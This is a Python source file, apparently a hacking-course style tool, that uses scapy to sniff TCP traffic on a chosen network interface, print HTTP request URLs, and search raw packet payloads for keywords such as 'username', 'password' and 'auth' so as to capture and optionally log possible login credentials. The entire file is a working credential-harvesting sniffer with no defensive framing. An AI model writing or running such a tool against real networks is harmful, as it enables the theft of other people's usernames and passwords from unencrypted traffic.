import scapy.all as scapy
from scapy.layers import http
from datetime import datetime
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface",
                        help="Use this to specify the interface. Example -i eth0")
    parser.add_argument('-w', "--write", dest="log",
                        help="Use this to save logs Example -w <file_name>")
    args = parser.parse_args()
    if not args.interface:
        parser.error("[-] Please specify an interface.")
    return args


options = get_arguments()


def sniff(interface):
    scapy.sniff(iface=interface, store=False,
                filter="tcp", prn=process_sniffed_packet)


def get_url(packet):
    if packet.haslayer(http.HTTPRequest):
        host = packet[http.HTTPRequest].Host.decode() if packet[http.HTTPRequest].Host else ""
        path = packet[http.HTTPRequest].Path.decode() if packet[http.HTTPRequest].Path else ""
        url = host + path
        return url
    return None


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "email",
                    "password", "pass", "pwd", "auth", "signin"]
        for keyword in keywords:
            if keyword in load.lower():
                return load
    return None


def log_info(url, login, filename="logs"):
    with open(f"{filename}.txt", "a") as f:
        f.write(f"[URL] [{datetime.now().strftime('%H:%M:%S')}] {url}\n")
        if login:
            f.write(
                f"[LOGIN] [{datetime.now().strftime('%H:%M:%S')}] Possible Username/Password >> {login}")


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url}")
        login_info = get_login_info(packet)
        if login_info:
            print(
                f"\n\n[{datetime.now().strftime('%H:%M:%S')}] Possible Username/Password >> {login_info}\n\n")
            if options.log:
                log_info(url, login_info, options.log)


def main():
    print("[+] Starting Packet Sniffer.")
    sniff(options.interface)


if __name__ == "__main__":
    main()
